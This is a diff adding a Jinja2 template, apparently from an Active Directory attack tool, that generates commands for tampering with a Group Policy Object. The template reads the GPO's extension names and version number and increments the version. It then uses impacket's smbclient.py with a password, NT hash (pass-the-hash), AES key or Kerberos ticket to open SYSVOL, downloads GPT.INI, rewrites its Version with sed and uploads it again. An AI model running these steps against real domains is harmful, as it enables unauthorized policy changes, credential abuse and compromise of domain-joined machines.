@@ -1,0 +1,40 @@
+# Get values
+{% if target.type == T_COMPUTER %}
+{% set key = 'gPCMachineExtensionNames' %}
+{% set inc = '1' %}
+{%- elif target.type == T_USER %}
+{% set key = 'gPCUserExtensionNames' %}
+{% set inc = '65536' %}
+{% endif %}
+{% set target_name = gpo.gpo_dirname_id %}
+{% set add_value = False %}
+{% set write_value = False %}
+{% set save_in_var = 'en' %}
+{% include '_Attr.jinja2' %}
+
+{% set key = 'versionNumber' %}
+{% set save_in_var = 'vn' %}
+{% include '_Attr.jinja2' %}
+
+echo $en
+echo $vn
+vn=$(($vn + {{inc}}))
+echo $vn
+
+# Browse SYSVOL
+{% if parent.krb_auth %}
+smbclient.py '{{fqdn}}/{{parent.obj.name}}'@{{dc_name}} -dc-ip {{dc_ip}} -k -no-pass
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+smbclient.py '{{fqdn}}/{{parent.obj.name}}'@{{dc_name}} -dc-ip {{dc_ip}} -hashes :{{parent.secret|red}}
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+smbclient.py '{{fqdn}}/{{parent.obj.name}}'@{{dc_name}} -dc-ip {{dc_ip}} -k -aesKey {{parent.secret|red}}
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+smbclient.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}'@{{dc_name}} -dc-ip {{dc_ip}}
+{% endif %}
+use SYSVOL
+cd /{{fqdn_lower}}/Policies/{{gpo.gpo_dirname_id}}/
+get GPT.INI
+CTRL-Z # pause the smbclient
+sed -i "s/^Version=[0-9]*/Version=$vn/g" GPT.INI
+fg # back to smbclient
+put GPT.INI
